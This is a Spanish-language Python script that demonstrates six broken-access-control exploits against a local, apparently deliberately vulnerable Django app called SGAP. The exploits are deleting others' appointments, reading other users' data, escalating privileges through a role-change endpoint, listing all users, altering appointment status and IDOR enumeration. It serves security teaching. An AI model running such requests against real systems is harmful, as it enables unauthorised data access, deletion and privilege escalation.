#!/usr/bin/env python3
"""
Script de Prueba de Vulnerabilidades - Broken Access Control
=============================================================

Este script demuestra cómo explotar las vulnerabilidades de control de acceso
implementadas en el sistema SGAP con fines educativos.

⚠️ SOLO PARA USO EDUCATIVO - NO USAR EN SISTEMAS DE PRODUCCIÓN ⚠️
"""

import requests
import json
import sys
from typing import Dict, Optional

# Colores para terminal


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    END = '\033[0m'


class VulnerabilityTester:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.csrf_token = None

    def print_header(self, text: str):
        """Imprime un encabezado destacado"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text:^70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}\n")

    def print_success(self, text: str):
        """Imprime mensaje de éxito"""
        print(f"{Colors.GREEN}✓ {text}{Colors.END}")

    def print_error(self, text: str):
        """Imprime mensaje de error"""
        print(f"{Colors.RED}✗ {text}{Colors.END}")

    def print_warning(self, text: str):
        """Imprime mensaje de advertencia"""
        print(f"{Colors.YELLOW}⚠ {text}{Colors.END}")

    def print_info(self, text: str):
        """Imprime información"""
        print(f"{Colors.BLUE}ℹ {text}{Colors.END}")

    def login(self, username: str, password: str) -> bool:
        """Inicia sesión en el sistema"""
        try:
            # Primero obtener el formulario para el token CSRF
            response = self.session.get(f"{self.base_url}/")

            # Intentar login
            response = self.session.post(
                f"{self.base_url}/",
                data={'username': username, 'password': password},
                allow_redirects=False
            )

            if response.status_code in [302, 200]:
                self.print_success(f"Sesión iniciada como: {username}")
                return True
            else:
                self.print_error(f"Error al iniciar sesión: {username}")
                return False
        except Exception as e:
            self.print_error(f"Error de conexión: {str(e)}")
            return False

    def test_vuln_1_delete_any_cita(self, cita_id: int):
        """
        VULNERABILIDAD 1: Eliminación de citas sin autorización
        """
        self.print_header("VULNERABILIDAD 1: Eliminación sin Autorización")
        self.print_info(f"Intentando eliminar la cita ID: {cita_id}")

        try:
            response = self.session.get(
                f"{self.base_url}/eliminar_cita/{cita_id}/",
                allow_redirects=False
            )

            if response.status_code in [200, 302]:
                self.print_success(
                    f"¡VULNERABILIDAD CONFIRMADA! Cita {cita_id} eliminada sin verificar permisos")
                self.print_warning(
                    "Impacto: Un usuario normal puede eliminar CUALQUIER cita del sistema")
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def test_vuln_2_view_other_users_citas(self, target_user_id: int):
        """
        VULNERABILIDAD 2: Acceso a datos de otros usuarios
        """
        self.print_header("VULNERABILIDAD 2: Acceso a Datos de Otros Usuarios")
        self.print_info(
            f"Intentando ver citas del usuario ID: {target_user_id}")

        try:
            response = self.session.get(
                f"{self.base_url}/ver_citas_usuario/?user_id={target_user_id}"
            )

            if response.status_code == 200:
                self.print_success(
                    "¡VULNERABILIDAD CONFIRMADA! Acceso a citas de otro usuario")
                self.print_warning(
                    "Impacto: Se pueden ver citas de CUALQUIER usuario manipulando el parámetro user_id")
                self.print_info(
                    f"Longitud de respuesta: {len(response.text)} caracteres")
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def test_vuln_3_privilege_escalation(self, user_id: int, make_staff: bool = True):
        """
        VULNERABILIDAD 3: Elevación de privilegios
        """
        self.print_header("VULNERABILIDAD 3: Elevación de Privilegios")
        action = "administrador" if make_staff else "usuario normal"
        self.print_info(
            f"Intentando convertir usuario ID {user_id} en {action}")

        try:
            response = self.session.get(
                f"{self.base_url}/cambiar_rol/",
                params={'user_id': user_id,
                    'is_staff': str(make_staff).lower()}
            )

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    self.print_success(
                        "¡VULNERABILIDAD CRÍTICA CONFIRMADA! Privilegios elevados")
                    self.print_warning(
                        "Impacto: CUALQUIER usuario puede convertirse en administrador")
                    self.print_info(
                        f"Usuario: {data.get('user')}, Es admin: {data.get('is_staff')}")
                else:
                    self.print_error(
                        f"Error en respuesta: {data.get('message')}")
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def test_vuln_4_list_all_users(self):
        """
        VULNERABILIDAD 4: Exposición de información sensible
        """
        self.print_header(
            "VULNERABILIDAD 4: Exposición de Información Sensible")
        self.print_info(
            "Intentando obtener lista de todos los usuarios del sistema")

        try:
            response = self.session.get(f"{self.base_url}/listar_usuarios/")

            if response.status_code == 200:
                data = response.json()
                usuarios = data.get('usuarios', [])
                total = data.get('total', 0)

                self.print_success(
                    f"¡VULNERABILIDAD CONFIRMADA! Se obtuvieron {total} usuarios")
                self.print_warning(
                    "Impacto: Exposición masiva de datos personales")

                # Mostrar algunos ejemplos
                if usuarios:
                    self.print_info("\nEjemplos de datos expuestos:")
                    for user in usuarios[:3]:  # Mostrar solo los primeros 3
                        print(f"  - Usuario: {user.get('username')}")
                        print(f"    Email: {user.get('email')}")
                        print(f"    Es admin: {user.get('is_staff')}")
                        print(
                            f"    Número de citas: {len(user.get('citas', []))}")
                        print()
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def test_vuln_5_modify_cita_status(self, cita_id: int, new_status: str = "Confirmada"):
        """
        VULNERABILIDAD 5: Modificación de estado sin permisos
        """
        self.print_header(
            "VULNERABILIDAD 5: Modificación de Estado sin Permisos")
        self.print_info(
            f"Intentando cambiar estado de cita {cita_id} a '{new_status}'")

        try:
            response = self.session.post(
                f"{self.base_url}/modificar_estado_cita/{cita_id}/",
                data={'estado': new_status}
            )

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    self.print_success(
                        "¡VULNERABILIDAD CONFIRMADA! Estado modificado sin autorización")
                    self.print_warning(
                        "Impacto: Los usuarios pueden auto-aprobar sus citas")
                    self.print_info(f"Cita {cita_id} ahora está: {new_status}")
                else:
                    self.print_error(f"Error: {data.get('message')}")
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def test_vuln_6_idor(self, cita_id: int):
        """
        VULNERABILIDAD 6: IDOR - Insecure Direct Object Reference
        """
        self.print_header("VULNERABILIDAD 6: IDOR - Acceso Directo a Objetos")
        self.print_info(f"Intentando obtener datos de cita ID: {cita_id}")

        try:
            response = self.session.get(
                f"{self.base_url}/obtener_datos_cita/{cita_id}/"
            )

            if response.status_code == 200:
                data = response.json()
                self.print_success(
                    "¡VULNERABILIDAD CONFIRMADA! Datos obtenidos sin verificar propiedad")
                self.print_warning(
                    "Impacto: Se puede enumerar y obtener TODAS las citas del sistema")

                # Mostrar datos sensibles obtenidos
                self.print_info("\nDatos sensibles expuestos:")
                print(f"  - Matrícula: {data.get('matricula')}")
                print(f"  - Nombre: {data.get('nombre_completo')}")
                print(f"  - Usuario: {data.get('usuario')}")
                print(f"  - Email: {data.get('usuario_email')}")
                print(f"  - Descripción: {data.get('descripcion')[:50]}...")
                print(
                    f"  - Comentarios: {data.get('comentarios_orientador')[:50]}...")
            else:
                self.print_info(f"Respuesta: {response.status_code}")
        except Exception as e:
            self.print_error(f"Error: {str(e)}")

    def enumerate_citas(self, max_id: int = 20):
        """
        Demuestra enumeración completa de recursos
        """
        self.print_header("DEMOSTRACIÓN: Enumeración de Citas")
        self.print_info(f"Intentando enumerar citas del 1 al {max_id}")

        found_citas = []

        for cita_id in range(1, max_id + 1):
            try:
                response = self.session.get(
                    f"{self.base_url}/obtener_datos_cita/{cita_id}/"
                )

                if response.status_code == 200:
                    found_citas.append(cita_id)
                    print(f"{Colors.GREEN}✓{Colors.END} Cita {cita_id} encontrada")
                else:
                    print(f"{Colors.RED}✗{Colors.END} Cita {cita_id} no existe")
            except:
                pass

        self.print_success(f"\nTotal de citas encontradas: {len(found_citas)}")
        self.print_warning(
            "¡Todas estas citas pueden ser accedidas sin autorización!")


def main():
    """Función principal"""
    print(f"""
{Colors.BOLD}{Colors.RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     SCRIPT DE PRUEBA DE VULNERABILIDADES                            ║
║     Broken Access Control - SGAP                                    ║
║                                                                      ║
║     ⚠️  SOLO PARA USO EDUCATIVO  ⚠️                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Colors.END}
    """)

    # Configuración
    BASE_URL = "http://127.0.0.1:8000"
    USERNAME = "estudiante"
    PASSWORD = "test123"
    
    print(f"{Colors.YELLOW}Este script probará las vulnerabilidades de control de acceso.{Colors.END}")
    print(f"{Colors.YELLOW}Asegúrate de que el servidor esté corriendo en {BASE_URL}{Colors.END}\n")
    
    # Crear tester
    tester = VulnerabilityTester(BASE_URL)
    
    # Intentar login
    print(f"\n{Colors.BOLD}Iniciando sesión...{Colors.END}")
    if not tester.login(USERNAME, PASSWORD):
        print(f"\n{Colors.RED}No se pudo iniciar sesión. Verifica las credenciales.{Colors.END}")
        print(f"{Colors.YELLOW}Crea un usuario con: python manage.py createsuperuser{Colors.END}")
        return
    
    # Ejecutar pruebas
    try:
        # Prueba 1: Eliminar cita sin autorización
        tester.test_vuln_1_delete_any_cita(cita_id=1)
        
        # Prueba 2: Ver citas de otro usuario
        tester.test_vuln_2_view_other_users_citas(target_user_id=1)
        
        # Prueba 3: Elevación de privilegios
        tester.test_vuln_3_privilege_escalation(user_id=2, make_staff=True)
        
        # Prueba 4: Listar todos los usuarios
        tester.test_vuln_4_list_all_users()
        
        # Prueba 5: Modificar estado de cita
        tester.test_vuln_5_modify_cita_status(cita_id=1, new_status="Confirmada")
        
        # Prueba 6: IDOR
        tester.test_vuln_6_idor(cita_id=1)
        
        # Demostración de enumeración
        # tester.enumerate_citas(max_id=10)  # Descomentar para probar
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Pruebas interrumpidas por el usuario{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Error inesperado: {str(e)}{Colors.END}")
    
    # Resumen final
    print(f"""
{Colors.BOLD}{Colors.BLUE}
╔══════════════════════════════════════════════════════════════════════╗
║                         RESUMEN                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.YELLOW}Las vulnerabilidades demostradas permiten:{Colors.END}

1. 🔓 Eliminar citas de cualquier usuario sin autorización
2. 👁️  Ver datos confidenciales de otros usuarios
3. ⬆️  Elevar privilegios y convertirse en administrador
4. 📋 Obtener lista completa de usuarios y sus datos
5. ✏️  Modificar estados de citas sin ser orientador
6. 🔍 Enumerar y acceder a todos los recursos del sistema

{Colors.RED}{Colors.BOLD}IMPACTO: CRÍTICO{Colors.END}
{Colors.RED}Estas vulnerabilidades permiten compromiso total del sistema.{Colors.END}

{Colors.GREEN}Para más información, revisa el archivo:{Colors.END}
{Colors.BLUE}VULNERABILIDADES_BROKEN_ACCESS_CONTROL.md{Colors.END}
    """)


if __name__ == "__main__":
    main()
